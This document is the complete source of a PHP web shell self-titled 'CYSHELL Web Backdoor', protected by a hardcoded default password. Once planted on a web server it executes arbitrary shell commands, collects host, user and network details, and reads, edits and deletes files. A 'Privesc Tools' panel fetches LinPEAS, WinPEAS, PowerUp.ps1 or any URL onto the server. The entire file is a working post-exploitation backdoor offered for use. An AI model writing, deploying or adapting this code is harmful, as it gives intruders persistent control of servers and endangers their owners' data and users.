<?php
declare(strict_types=1);

ini_set('display_errors', '0');
error_reporting(0);

const APP_PASSWORD = 'CYSHELL'; /* CHANGE THIS PASSWORD */

session_start();

function is_ajax(): bool
{
    return !empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest';
}

function run(string $cmd): string
{
    if (!function_exists('shell_exec')) return "shell_exec is disabled.";
    return shell_exec($cmd . ' 2>&1') ?? '';
}

function format_size(int $bytes): string
{
    if ($bytes === 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = floor(log($bytes, 1024));
    return round($bytes / (1024 ** $i), 2) . ' ' . $units[$i];
}

function format_perms(string $path): string
{
    $perms = @fileperms($path);
    if ($perms === false) return '??????????';
    $info = is_dir($path) ? 'd' : '-';
    $info .= ($perms & 0x0100) ? 'r' : '-'; $info .= ($perms & 0x0080) ? 'w' : '-'; $info .= ($perms & 0x0040) ? 'x' : '-';
    $info .= ($perms & 0x0020) ? 'r' : '-'; $info .= ($perms & 0x0010) ? 'w' : '-'; $info .= ($perms & 0x0008) ? 'x' : '-';
    $info .= ($perms & 0x0004) ? 'r' : '-'; $info .= ($perms & 0x0002) ? 'w' : '-'; $info .= ($perms & 0x0001) ? 'x' : '-';
    return $info;
}

function handle_auth(): void
{
    if (isset($_GET['logout'])) {
        session_destroy();
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
    if (isset($_SESSION['is_logged'])) return;

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (password_verify($_POST['password'], password_hash(APP_PASSWORD, PASSWORD_DEFAULT))) {
            $_SESSION['is_logged'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        }
    }
    display_login();
}

function handle_ajax_request(): void
{
    if (!is_ajax() || !isset($_SESSION['is_logged'])) return;

    header('Content-Type: application/json');
    $input = json_decode(file_get_contents('php://input'), true);
    $action = $input['action'] ?? '';
    $payload = $input['payload'] ?? [];
    $response = ['status' => 'error', 'message' => 'Invalid action.'];

    try {
        switch ($action) {
            case 'get_system_info':
                $is_windows = str_starts_with(strtoupper(PHP_OS), 'WIN');
                $info = [];
                $info['OS Family'] = $is_windows ? 'Windows' : 'Linux/Unix';
                $info['Hostname'] = run('hostname');
                $info['Current User'] = run('whoami');
                if ($is_windows) {
                    $info['System Info'] = run('systeminfo');
                    $info['Network Info'] = run('ipconfig /all');
                } else {
                    $info['OS Release'] = file_exists('/etc/os-release') ? run('cat /etc/os-release') : 'N/A';
                    $info['Kernel'] = run('uname -a');
                    $info['Network Info'] = run('ip a');
                }
                $response = ['status' => 'success', 'data' => $info];
                break;
            case 'download_tool':
                $tool = $payload['tool'] ?? '';
                $url = $payload['url'] ?? '';
                $urls = [
                    'linpeas' => 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh',
                    'winpeas' => 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat',
                    'powersploit' => 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'
                ];
                if ($tool === 'custom') {
                    if (empty($url) || !filter_var($url, FILTER_VALIDATE_URL)) throw new Exception('Invalid custom URL provided.');
                    $download_url = $url;
                    $filename = basename(parse_url($url, PHP_URL_PATH));
                } else {
                    if (!isset($urls[$tool])) throw new Exception('Invalid tool selected.');
                    $download_url = $urls[$tool];
                    $filename = basename($download_url);
                }
                $temp_dir = sys_get_temp_dir();
                if (!is_writable($temp_dir)) throw new Exception("Temp directory '{$temp_dir}' is not writable.");
                $save_path = $temp_dir . DIRECTORY_SEPARATOR . $filename;
                $content = @file_get_contents($download_url);
                if ($content === false) throw new Exception("Failed to download from {$download_url}");
                if (file_put_contents($save_path, $content) === false) throw new Exception("Failed to save file to {$save_path}");
                $response = ['status' => 'success', 'data' => "Successfully downloaded '{$filename}' to {$save_path}"];
                break;
            case 'list_files':
                $path = $payload['path'] ?? __DIR__;
                $full_path = realpath($path);
                if ($full_path === false || !is_dir($full_path)) throw new Exception("Path does not exist or is not a directory: " . htmlspecialchars($path));
                $files = [];
                foreach (scandir($full_path) as $item) {
                    if ($item === '.') continue;
                    $item_path = $full_path . DIRECTORY_SEPARATOR . $item;
                    $files[] = ['name' => $item, 'path' => $item_path, 'type' => is_dir($item_path) ? 'dir' : 'file', 'size' => is_dir($item_path) ? '' : format_size(@filesize($item_path)), 'perms' => format_perms($item_path), 'mtime' => date("Y-m-d H:i:s", @filemtime($item_path))];
                }
                usort($files, fn($a, $b) => ($a['name'] === '..') ? -1 : (($b['name'] === '..') ? 1 : (($a['type'] === $b['type']) ? strnatcasecmp($a['name'], $b['name']) : ($a['type'] === 'dir' ? -1 : 1))));
                $response = ['status' => 'success', 'data' => ['files' => $files, 'current_path' => $full_path]];
                break;
            case 'get_file_content':
                $path = $payload['path'] ?? '';
                if (empty($path) || !is_file($path) || !is_readable($path)) throw new Exception('File not found or is not readable.');
                $response = ['status' => 'success', 'data' => file_get_contents($path)];
                break;
            case 'save_file_content':
                $path = $payload['path'] ?? '';
                if (empty($path) || !is_file($path) || !is_writable($path)) throw new Exception('File not found or is not writable.');
                if (file_put_contents($path, $payload['content'] ?? '') === false) throw new Exception('Failed to save file.');
                $response = ['status' => 'success', 'data' => 'File saved successfully.'];
                break;
            case 'read_self':
                $content = file_get_contents(__FILE__); if ($content === false) throw new Exception('Could not read script content.');
                $response = ['status' => 'success', 'data' => $content];
                break;
            case 'chmod_self':
                if (!function_exists('chmod')) throw new Exception('`chmod` function is disabled.');
                if (@chmod(__FILE__, 0755)) $response = ['status' => 'success', 'data' => 'Script permissions changed to 755 (rwxr-xr-x).']; else throw new Exception('Failed to change script permissions.');
                break;
            case 'execute':
                $command = $payload['command'] ?? ''; $output = run($command);
                $response = ['status' => 'success', 'data' => htmlspecialchars($output)];
                break;
            case 'file_op':
                $operation = $payload['operation'] ?? ''; $path = $payload['path'] ?? '';
                if (empty($path)) throw new Exception('Path cannot be empty.');
                $parent_dir = dirname($path); if (!is_writable($parent_dir)) throw new Exception("Permission Denied: Directory '{$parent_dir}' is not writable.");
                $message = '';
                switch ($operation) {
                    case 'delete':
                        if (!file_exists($path)) throw new Exception('File or directory does not exist.');
                        if (is_dir($path)) { if (count(scandir($path)) > 2) throw new Exception('Directory is not empty.'); $success = rmdir($path); } else { $success = unlink($path); }
                        if (!$success) throw new Exception('Failed to delete.');
                        $message = 'Deleted: ' . htmlspecialchars($path);
                        break;
                    case 'mkdir':
                        if (file_exists($path)) throw new Exception('File or directory already exists.');
                        if (!mkdir($path)) throw new Exception('Failed to create directory.');
                        $message = 'Created directory: ' . htmlspecialchars($path);
                        break;
                    case 'touch':
                        if (file_exists($path)) throw new Exception('File already exists.');
                        if (!touch($path)) throw new Exception('Failed to create file.');
                        $message = 'Created file: ' . htmlspecialchars($path);
                        break;
                    default: throw new Exception('Invalid file operation.');
                }
                $response = ['status' => 'success', 'data' => $message];
                break;
        }
    } catch (Throwable $e) { $response = ['status' => 'error', 'message' => $e->getMessage()]; }
    echo json_encode($response);
    exit;
}

function display_login(): void {
?>
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Login</title><script src="https://cdn.tailwindcss.com"></script><link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet"><style>body { font-family: 'JetBrains Mono', monospace; }</style></head><body class="bg-gray-800 text-white flex items-center justify-center h-screen"><div class="bg-gray-900 p-8 rounded-lg shadow-lg w-full max-w-sm"><h1 class="text-2xl font-bold text-center mb-6">Authentication Required</h1><form action="<?= htmlspecialchars($_SERVER['PHP_SELF']) ?>" method="post"><div class="mb-4"><label for="password" class="block text-gray-400 mb-2">Password</label><input type="password" name="password" id="password" class="w-full p-3 bg-gray-700 border border-gray-600 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500" required></div><button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg transition duration-300">Login</button></form></div></body></html>
<?php exit; }

handle_auth();
handle_ajax_request();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>CYSHELL Web Backdoor</title>
    <script src="https://cdn.tailwindcss.com"></script><script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/codemirror.min.js"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/codemirror.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/mode/meta.min.js"></script>
    <style>body{font-family:'JetBrains Mono',monospace;background-color:#111827;color:#d1d5db}[x-cloak]{display:none !important}.CodeMirror{height:100%;border-radius:.5rem}</style>
</head>
<body class="bg-gray-900">
<div class="container mx-auto p-4" x-data="webShell()" x-init="init()" x-cloak>
    <header class="flex justify-between items-center mb-6">
        <h1 class="text-3xl font-bold text-white"><i class="fa-solid fa-terminal mr-3"></i>Web Shell</h1>
        <a href="?logout=true" class="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded-lg">Logout</a>
    </header>

    <div class="grid grid-cols-1 xl:grid-cols-3 gap-6">
        <main class="xl:col-span-2 bg-gray-800 p-4 rounded-lg shadow-lg flex flex-col h-[85vh]">
            <div class="flex border-b border-gray-700 mb-4">
                <button @click="activeTab = 'explorer'" :class="{'bg-gray-700 text-white': activeTab === 'explorer', 'text-gray-400': activeTab !== 'explorer'}" class="py-2 px-4 font-semibold rounded-t-lg"><i class="fas fa-folder-open mr-2"></i>Explorer</button>
                <button @click="activeTab = 'sysinfo'" :class="{'bg-gray-700 text-white': activeTab === 'sysinfo', 'text-gray-400': activeTab !== 'sysinfo'}" class="py-2 px-4 font-semibold rounded-t-lg"><i class="fas fa-microchip mr-2"></i>System Info</button>
                <button @click="activeTab = 'privesc'" :class="{'bg-gray-700 text-white': activeTab === 'privesc', 'text-gray-400': activeTab !== 'privesc'}" class="py-2 px-4 font-semibold rounded-t-lg"><i class="fas fa-user-secret mr-2"></i>Privesc Tools</button>
            </div>
            <div x-show="activeTab === 'explorer'" class="flex flex-col flex-grow min-h-0">
                <div class="bg-gray-700 p-2 rounded-md mb-4 text-gray-400 text-sm break-all flex items-center justify-between">
                    <div class="truncate pr-2"><i class="fas fa-folder-open mr-2"></i><span x-text="currentPath"></span></div>
                    <div class="space-x-2 flex-shrink-0"><button @click="history.back()" class="px-2 py-1 bg-gray-600 rounded hover:bg-gray-500" title="Back"><i class="fas fa-arrow-left"></i></button><button @click="history.forward()" class="px-2 py-1 bg-gray-600 rounded hover:bg-gray-500" title="Forward"><i class="fas fa-arrow-right"></i></button></div>
                </div>
                <div class="overflow-auto flex-grow">
                     <table class="table-auto w-full text-left text-sm">
                        <thead class="bg-gray-800 text-gray-400 uppercase text-xs sticky top-0"><tr><th class="p-3">Name</th><th class="p-3">Size</th><th class="p-3">Perms</th><th class="p-3">Modified</th><th class="p-3 text-right">Actions</th></tr></thead>
                        <tbody><template x-for="file in files" :key="file.path"><tr class="border-b border-gray-700 hover:bg-gray-600/50"><td class="p-2 truncate"><a href="#" @click.prevent="navigate(file)" class="flex items-center" :title="file.path"><i class="mr-3 fa-lg" :class="file.icon"></i><span x-text="file.name"></span></a></td><td class="p-2" x-text="file.size"></td><td class="p-2 font-mono" x-text="file.perms"></td><td class="p-2" x-text="file.mtime"></td><td class="p-2 text-right space-x-3 text-base"><button x-show="file.type==='file'" @click="editFile(file)" class="text-blue-400 hover:text-blue-300" title="Edit"><i class="fas fa-edit"></i></button><button x-show="file.name !=='..'" @click="deleteFile(file)" class="text-red-500 hover:text-red-400" title="Delete"><i class="fas fa-trash"></i></button></td></tr></template></tbody>
                    </table>
                </div>
            </div>
            <div x-show="activeTab === 'sysinfo'" class="overflow-auto flex-grow">
                 <button x-show="!systemInfo" @click="getSystemInfo()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold p-4 rounded-lg text-lg">Scan System Information</button>
                 <div x-show="systemInfo" class="space-y-4">
                    <template x-for="(value, key) in systemInfo" :key="key">
                        <div class="bg-gray-700 rounded-lg p-4">
                            <h3 class="font-bold text-lg text-white mb-2" x-text="key"></h3>
                            <pre class="bg-black text-xs p-3 rounded-md overflow-auto max-h-64" x-text="value"></pre>
                        </div>
                    </template>
                 </div>
            </div>
            <div x-show="activeTab === 'privesc'" class="overflow-auto flex-grow">
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div class="bg-gray-700 rounded-lg p-4 flex flex-col items-center text-center"><img src="https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/images/peass.png" class="h-16 mb-2"><h3 class="font-bold text-white">LinPEAS</h3><p class="text-xs text-gray-400 mb-3 flex-grow">Linux Privilege Escalation Awesome Script</p><button @click="downloadTool('linpeas')" class="w-full bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-2 rounded">Download</button></div>
                    <div class="bg-gray-700 rounded-lg p-4 flex flex-col items-center text-center"><img src="https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/images/peass.png" class="h-16 mb-2"><h3 class="font-bold text-white">WinPEAS</h3><p class="text-xs text-gray-400 mb-3 flex-grow">Windows Privilege Escalation Awesome Script</p><button @click="downloadTool('winpeas')" class="w-full bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-2 rounded">Download</button></div>
                    <div class="bg-gray-700 rounded-lg p-4 flex flex-col items-center text-center"><i class="fab fa-powershell fa-3x mb-2 text-blue-400"></i><h3 class="font-bold text-white">PowerSploit</h3><p class="text-xs text-gray-400 mb-3 flex-grow">PowerUp.ps1 for PowerShell privesc</p><button @click="downloadTool('powersploit')" class="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 rounded">Download</button></div>
                    <div class="bg-gray-700 rounded-lg p-4"><h3 class="font-bold text-white text-center mb-2">Custom Tool</h3><p class="text-xs text-gray-400 mb-3 text-center">Download from any URL.</p><input type="text" x-model="customUrl" placeholder="https://example.com/tool.sh" class="w-full p-2 bg-gray-800 border border-gray-600 rounded text-white mb-3"><button @click="downloadTool('custom', customUrl)" class="w-full bg-gray-500 hover:bg-gray-600 text-white font-bold py-2 rounded">Download</button></div>
                </div>
            </div>
        </main>
        <aside class="flex flex-col gap-6 h-[85vh]">
            <div class="bg-gray-800 p-4 rounded-lg shadow-lg">
                <h2 class="text-xl font-semibold text-white mb-4">Self-Actions</h2>
                <div class="flex items-center gap-2"><button @click="viewSelf()" class="flex-grow bg-purple-600 hover:bg-purple-700 text-white font-bold p-3 rounded-lg text-sm">View Source</button><button @click="chmodSelf()" class="flex-grow bg-teal-600 hover:bg-teal-700 text-white font-bold p-3 rounded-lg text-sm">Make Executable</button></div>
            </div>
            <div class="bg-gray-800 p-4 rounded-lg shadow-lg">
                <h2 class="text-xl font-semibold text-white mb-4">Command Executor</h2>
                <div class="relative"><input type="text" x-model="command" @keydown.enter="executeCommand" placeholder="Enter command..." class="w-full p-3 bg-gray-700 border border-gray-600 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500 pr-12"><i class="fa-solid fa-arrow-right-to-bracket absolute right-4 top-3.5 text-gray-400"></i></div>
            </div>
            <div class="bg-gray-800 p-4 rounded-lg shadow-lg flex flex-col flex-grow min-h-0">
                <h2 class="text-xl font-semibold text-white mb-4 flex justify-between"><span>Output</span><button @click="output=''" class="text-sm bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-1 px-3 rounded-lg">Clear</button></h2>
                <pre class="bg-black text-xs p-4 rounded-md overflow-auto h-full" x-html="output"></pre>
            </div>
        </aside>
    </div>
    <div x-show="isEditing" @keydown.window.escape="closeEditor" class="fixed inset-0 bg-black/70 flex items-center justify-center p-4 z-50">
        <div class="bg-gray-800 rounded-lg shadow-xl w-full h-full max-w-6xl flex flex-col" @click.outside="closeEditor">
            <header class="bg-gray-900 p-3 flex justify-between items-center rounded-t-lg"><h3 class="font-bold text-white truncate" x-text="`Editing: ${editingFile.path}`"></h3><div><button @click="saveFile" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded-lg mr-2">Save</button><button @click="closeEditor" class="bg-gray-600 hover:bg-gray-700 text-white font-bold py-2 px-4 rounded-lg">Cancel</button></div></header>
            <main class="p-2 flex-grow"><textarea id="editor"></textarea></main>
        </div>
    </div>
</div>
<script>
function webShell() {
    return {
        activeTab: 'explorer', command: 'whoami && pwd', currentPath: '', files: [], output: 'Initialized.', isEditing: false, editingFile: {}, editor: null, systemInfo: null, customUrl: '',
        init() {
            const urlPath = new URLSearchParams(window.location.search).get('path') || '<?= addslashes(__DIR__) ?>'; this.getFiles(urlPath);
            window.addEventListener('popstate', (e) => this.getFiles(e.state?.path || '<?= addslashes(__DIR__) ?>'));
        },
        async api(action, payload) {
            try {
                const res = await fetch('<?= htmlspecialchars($_SERVER['PHP_SELF']) ?>', { method: 'POST', headers: {'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'}, body: JSON.stringify({ action, payload }) });
                if (!res.ok) throw new Error('Network error.');
                const result = await res.json();
                if (result.status !== 'success') throw new Error(result.message);
                return result.data;
            } catch (e) { this.output = `<span class="text-red-400">Error: ${e.message}</span>`; return null; }
        },
        async getFiles(path) {
            this.output = 'Loading...'; const data = await this.api('list_files', { path });
            if (data) {
                this.files = data.files.map(f => ({ ...f, icon: f.type === 'dir' ? 'fa-solid fa-folder text-yellow-400' : 'fa-solid fa-file-lines text-gray-400' }));
                this.currentPath = data.current_path;
                if(new URLSearchParams(window.location.search).get('path') !== path) history.pushState({path}, '', `?path=${encodeURIComponent(path)}`);
                this.output = `Listed contents of ${this.currentPath}`;
            }
        },
        async getSystemInfo() { this.systemInfo = {'Status': 'Scanning...'}; const data = await this.api('get_system_info'); if (data) this.systemInfo = data; },
        async downloadTool(tool, url = '') { this.output = `Downloading ${tool}...`; const data = await this.api('download_tool', {tool, url}); if(data) {this.output = data; this.customUrl = '';} },
        async navigate(file) {
            if (file.type === 'dir') return this.getFiles(file.path);
            this.output = 'Reading file...';
            const content = await this.api('get_file_content', { path: file.path });
            if (content !== null) this.output = `<span class="text-yellow-400">--- ${this.htmlspecialchars(file.name)} ---</span>\n${this.htmlspecialchars(content)}`;
        },
        async deleteFile(file) {
            if (!confirm(`Are you sure you want to delete '${file.name}'?`)) return;
            const data = await this.api('file_op', { operation: 'delete', path: file.path });
            if (data) { this.output = data; this.getFiles(this.currentPath); }
        },
        async editFile(file) {
            const content = await this.api('get_file_content', { path: file.path }); if (content === null) return;
            this.editingFile = file; this.isEditing = true;
            this.$nextTick(() => { const info = CodeMirror.findModeByExtension(file.name.split('.').pop()); this.editor = CodeMirror.fromTextArea(document.getElementById('editor'), { lineNumbers: true, mode: info ? info.mode : 'text/plain', value: content }); });
        },
        async saveFile() {
            if (!this.editor) return; const content = this.editor.getValue();
            const data = await this.api('save_file_content', { path: this.editingFile.path, content });
            if (data) { this.output = data; this.closeEditor(); }
        },
        closeEditor() { if (this.editor) { this.editor.toTextArea(); this.editor = null; } this.isEditing = false; this.editingFile = {}; },
        async executeCommand() {
            if (!this.command.trim()) return; this.output = 'Executing...';
            const safePath = this.currentPath.replace(/'/g, "'\\''");
            const data = await this.api('execute', { command: `cd '${safePath}' && ${this.command}` });
            if (data !== null) this.output = data;
            this.command = '';
        },
        async viewSelf() {
            this.output = 'Reading script source...'; const data = await this.api('read_self');
            if (data !== null) this.output = `<span class="text-yellow-400">--- Source: <?= basename(__FILE__) ?> ---</span>\n${this.htmlspecialchars(data)}`;
        },
        async chmodSelf() { const data = await this.api('chmod_self'); if (data) this.output = data; },
        htmlspecialchars(str) { return str.toString().replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;'); }
    }
}
</script>
</body>
</html>
